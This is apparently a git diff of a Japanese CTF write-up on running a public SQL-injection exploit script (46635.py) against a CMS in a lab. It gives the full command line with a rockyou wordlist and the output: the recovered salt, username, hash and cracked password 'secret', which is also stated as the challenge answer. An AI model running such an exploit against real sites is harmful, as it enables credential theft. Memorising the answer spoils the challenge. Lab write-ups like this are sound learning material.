@@ -239,9 +239,27 @@ Options:
 
 これを見るに、-c,--crackで割れると記載されている
 
-つまり、今回の脆弱性のPoCは出力するハッシュ値が特殊である。johnで割れず辞書指定して-c,--crackで割るのが正解。
+つまり、今回の脆弱性のPoCは出力するハッシュ値が特殊である。johnで割れず辞書指定して-c,--crackで割る。
+⇒それでも割れなかった。エンコードがUTF-8じゃないといわれて、そこも修正したが割れなかった。
+
+そもそもadminでをるという考えはあっているのではないかと推測  
+それにURLが間違っているのではないかと考え、PoC内部を調査したところ、
+/moduleinterface.php?mact=News,m1_,default,0 ⇒調査対象のCMSの内部API（内部処理）をたたいてる   
+つまりhttp://IP//simpleまで指定であっていた。
+
+また、今までpython3で実行していたが、lib2to3を使用して文字列の修正やエンコードの修正だけでなく、
+そのほかにもいろいろと修正しなければならなかったため、時間を考え最終的にpython2で実行した。
+
+Python2 用の termcolorが入っていなかったのでwgetで取得しインストールした。
+
+python2 46635.py -u http://10.49.141.85/simple --crack -w /usr/share/wordlists/rockyou.txt
+[+] Salt for password found: 1dac0d92e9fa6bb2
+[+] Username found: mitch
+[+] Email found: admin@admin.com
+[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
+[+] Password cracked: secret
 
 ```
 </details>
 
-
+上記結果より、**secret**と回答
